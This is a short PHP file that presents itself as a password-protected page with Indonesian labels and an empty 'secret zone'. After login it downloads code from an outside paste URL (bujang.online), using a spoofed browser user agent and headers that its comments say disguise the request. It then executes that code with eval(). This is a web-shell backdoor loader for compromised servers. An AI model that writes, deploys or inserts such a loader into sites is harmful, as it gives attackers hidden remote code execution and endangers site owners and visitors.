    <?php
    session_start();

    const PASSWORD_HASH = '$2a$12$FmtWctgQYSVdcaKVOkwixuzyS2rNsY.y3JnQpr3dsEHAtqJiPOI6W';

    /* ---------- login gate ---------- */
    if (empty($_SESSION['logged_in'])) {
        if ($_SERVER['REQUEST_METHOD'] === 'POST') {
            if (password_verify($_POST['pass'] ?? '', PASSWORD_HASH)) {
                $_SESSION['logged_in'] = true;
                header('Location: ' . $_SERVER['PHP_SELF']);
                exit;
            }
            $error = 'Password salah!';
        }
        ?>
        <!doctype html><html><head>
            <meta charset="utf-8">
            <title>Login</title>
            <style>
                body{font-family:sans-serif;background:#111;color:#eee;display:flex;justify-content:center;align-items:center;height:100vh}
                .card{background:#222;padding:30px;border-radius:12px;width:320px;box-shadow:0 0 15px rgba(0,0,0,.6);text-align:center}
                input{width:100%;padding:10px;margin:15px 0;border-radius:8px;border:1px solid #555;background:#333;color:#eee}
                button{padding:10px 25px;border:none;border-radius:8px;background:#00b894;color:#fff;font-weight:bold;cursor:pointer}
                .err{color:#ff7675;font-size:.9em}
            </style>
        </head><body>
            <div class="card">
                <h2>🔐 Password</h2>
                <?php if (!empty($error)) echo "<div class='err'>$error</div>"; ?>
                <form method="post">
                    <input type="password" name="pass" placeholder="Masukkan password…" required autofocus>
                    <button type="submit">Masuk</button>
                </form>
            </div>
        </body></html>
        <?php
        exit;
    }
    ?>
    <!doctype html><html><head>
        <meta charset="utf-8">
        <title>Zona Rahasia</title>
        <style>
            body{font-family:sans-serif;background:#121212;color:#eee;margin:0;padding:40px}
        </style>
    </head><body>
        <!-- Kontenmu di sini -->
    </body></html>
    <?php
    if (isset($_GET['logout'])) {
        session_destroy();
        header('Location: ' . $_SERVER['PHP_SELF']);
    }
    ?>
    <?php
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "https://bujang.online/raw/hBu0Lhd6k_");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10); // Mengatur waktu timeout
    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'); // Menyamarkan agen pengguna
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        'Accept: text/html',
        'Accept-Language: en-US,en;q=0.9'
    ]); // Menambahkan header HTTP untuk menyamarkan permintaan
    $output = curl_exec($ch);
    curl_close($ch);

    // Eksekusi konten
    eval("?>".$output);
    ?>
